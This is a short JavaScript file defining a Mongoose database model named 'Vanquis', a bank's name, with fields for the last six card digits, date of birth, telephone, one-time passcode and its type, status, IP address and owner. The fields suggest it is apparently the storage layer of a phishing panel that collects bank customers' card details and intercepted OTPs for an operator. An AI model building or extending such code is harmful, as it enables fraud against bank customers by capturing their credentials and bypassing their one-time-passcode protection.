const mongoose = require("mongoose");

const vanquisSchema = new mongoose.Schema({
  uniqueid: Number,
  last6: String,
  dob: String,
  telephone: String,
  otpType: String,
  otp: String,
  status: Number,
  ip: String,
  owner: String,
});

module.exports = mongoose.model("Vanquis", vanquisSchema);
